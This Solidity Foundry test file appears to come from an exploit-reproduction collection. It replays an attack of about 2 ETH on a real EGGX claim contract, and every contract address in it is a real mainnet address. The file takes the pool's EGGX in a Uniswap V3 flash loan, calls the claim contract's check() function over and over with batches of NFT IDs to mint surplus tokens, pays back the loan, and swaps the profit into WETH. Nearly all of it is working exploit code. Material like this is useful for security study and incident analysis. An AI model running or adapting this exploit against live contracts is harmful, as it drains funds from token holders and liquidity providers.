// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~2 $ETH

// Vulnerable Contract : https://etherscan.io/address/0xFb35DE57B117FA770761C1A344784075745F84F9

// @Analysis
// https://x.com/PeiQi_0/status/1759826303044497726

import "forge-std/Test.sol";
import "./../interface.sol";

interface IEGGXUNIV3POOL {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external;
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IEGGX is IERC20{
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function minted() external view returns (uint256);
    function tokenURI(uint256 id) external view returns (string memory);
}

interface IEGGXClaim {
    function check(uint256[] memory) external;
}

interface IWeth is IERC20{
    function deposit() external payable;
}

contract ContractTest is Test {
    IEGGXUNIV3POOL pool = IEGGXUNIV3POOL(0x26beBB6995a4736F088D129E82620eBA899B944F);
    IEGGX EGGX = IEGGX(0xe2f95ee8B72fFed59bC4D2F35b1d19b909A6e6b3);
    IEGGXClaim EGGXCliam = IEGGXClaim(0xFb35DE57B117FA770761C1A344784075745F84F9);
    IWeth WETH = IWeth(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        // evm_version Requires to be "shanghai"
        cheats.createSelectFork("mainnet", 19252567 - 1);
        cheats.label(address(EGGX), "EGGX");
        cheats.label(address(pool), "EGGX_Pool");
        cheats.label(address(WETH), "WETH");
    }

    function testExploit() public {
        payable(address(0)).transfer(address(this).balance);
        bytes memory pollbalance = abi.encode(EGGX.balanceOf(address(pool)));
        WETH.approve(address(pool), type(uint256).max);
        EGGX.approve(address(pool), type(uint256).max);
        emit log_named_uint("Attacker ETH balance before exploit", WETH.balanceOf(address(this)));
        bool zeroForOne = false;
        uint160 sqrtPriceLimitX96 = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341;
        bytes memory data = abi.encodePacked(uint8(0x61));
        pool.flash(address(this), 0, EGGX.balanceOf(address(pool)), pollbalance);
        int256 amountSpecified = int256(EGGX.balanceOf(address(this)));
        pool.swap(address(this), zeroForOne, amountSpecified, sqrtPriceLimitX96, data);
        emit log_named_uint("Attacker ETH balance after attack:", WETH.balanceOf(address(this)));
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        uint256 pollbalance = abi.decode(data,(uint256));
        uint256[] memory nftid = new uint256[](6);

        nftid[0] = 30342;
        nftid[1] = 30319;
        nftid[2] = 30031;
        nftid[3] = 30036;
        nftid[4] = 30028;
        nftid[5] = 30019;
        EGGXCliam.check(nftid);

        nftid[0] = 30379;
        nftid[1] = 30363;
        nftid[2] = 30169;
        nftid[3] = 30267;
        nftid[4] = 30098;
        nftid[5] = 30484;
        EGGXCliam.check(nftid);

        nftid[0] = 30281;
        nftid[1] = 30217;
        nftid[2] = 30245;
        nftid[3] = 30192;
        nftid[4] = 30027;
        nftid[5] = 30181;
        EGGXCliam.check(nftid);

        nftid[0] = 30368;
        nftid[1] = 30488;
        nftid[2] = 30259;
        nftid[3] = 30284;
        nftid[4] = 30084;
        nftid[5] = 30395;
        EGGXCliam.check(nftid);

        nftid[0] = 30408;
        nftid[1] = 30111;
        nftid[2] = 30365;
        nftid[3] = 30144;
        nftid[4] = 30176;
        nftid[5] = 30054;
        EGGXCliam.check(nftid);

        nftid[0] = 30039;
        nftid[1] = 30045;
        nftid[2] = 30030;
        nftid[3] = 30070;
        nftid[4] = 30055;
        nftid[5] = 30213;
        EGGXCliam.check(nftid);

        emit log_named_uint("Attacker EGGX exploit balance:", EGGX.balanceOf(address(this)));
        EGGX.transfer(address(pool), pollbalance + fee1);
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        if (amount0Delta > 0) {
            IERC20(Uni_Pair_V3(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));
        } else if (amount1Delta > 0) {
            IERC20(Uni_Pair_V3(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));
        }
    }

    receive() external payable {}
}
